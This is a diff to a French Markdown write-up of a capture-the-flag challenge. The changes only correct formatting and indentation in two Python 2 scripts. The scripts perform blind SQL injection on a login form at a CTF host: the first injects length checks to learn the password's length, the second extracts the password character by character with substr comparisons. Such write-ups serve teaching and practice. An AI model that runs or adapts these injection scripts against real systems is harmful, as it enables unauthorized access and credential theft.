@@ -68,21 +68,21 @@ On va tester &agrave; chaque fois la requ&egrave;te __admin' and length(password
 On utilise pour &ccedil;a un petit script qui va nous servir pour la suite:
 
 ```python
-# ! /usr/bin/python
-# -*- coding : utf-8 -*-
+#! /usr/bin/python
+# -*- coding: utf-8 -*-
 
 import mechanize
 import urllib
 
-for i in range(50) :
-params = 'username' : "admin' and length(password)=" + str(i) + " --",
-'password' : 'rien'
-http_params = urllib.urlencode(params)
+for i in range(50):
+    params = {'username': "admin' and length(password)=" + str(i) + " --",
+              'password': 'rien'}
+    http_params = urllib.urlencode(params)
 
-rep = mechanize.Browser().open('http://arrive.chal.mmactf.link/login.cgi', http_params).read()
-if rep.find('The flag is your password') != -1 :
-print 'len password : %d' %i
-exit(0)
+    rep = mechanize.Browser().open('http://arrive.chal.mmactf.link/login.cgi', http_params).read()
+    if rep.find('The flag is your password') != -1:
+        print 'len password : %d' %i
+        exit(0)
 ```
 > len password : 20
 
@@ -95,27 +95,27 @@ et YY va prendre toutes les caract&egrave;res ASCII possibles.
 Voici le script de l'exploit final:
 
 ```python
-# ! /usr/bin/python
-# -*- coding : utf-8 -*-
+#! /usr/bin/python
+# -*- coding: utf-8 -*-
 
 import mechanize
 import urllib
 
 flag = ''
-for pos in range(20) :
-print 'position : %d' % pos
-for car in 'MA0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLNOPQRSTUVWXYZ_-*. : ;, ?=+' :
-print '\t-> tested characted : %s' % car
+for pos in range(20):
+    print 'position : %d' % pos
+    for car in 'MA{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLNOPQRSTUVWXYZ_-*.:;,?=+':
+        print '\t-> caractére testé : %s' % car
 
-params = 'username' : "admin' and substr(password," + str(pos+1) + ",1) = char(" + str(ord(car)) + ") --",
-'password' : 'rien'
-http_params = urllib.urlencode(params)
+        params = {'username': "admin' and substr(password," + str(pos+1)  + ",1) = char(" + str(ord(car)) + ") --",
+                  'password': 'rien'}
+        http_params = urllib.urlencode(params)
 
-rep = mechanize.Browser().open('http://arrive.chal.mmactf.link/login.cgi', http_params).read()
-if rep.find('The flag is your password') != -1 :
-flag += car
-print 'password (pour le moment) : %s' % flag
-break
+        rep = mechanize.Browser().open('http://arrive.chal.mmactf.link/login.cgi', http_params).read()
+        if rep.find('The flag is your password') != -1:
+            flag += car
+            print 'password (pour le moment) : %s' % flag
+            break
 
 print 'flag : %s' % flag
 ```
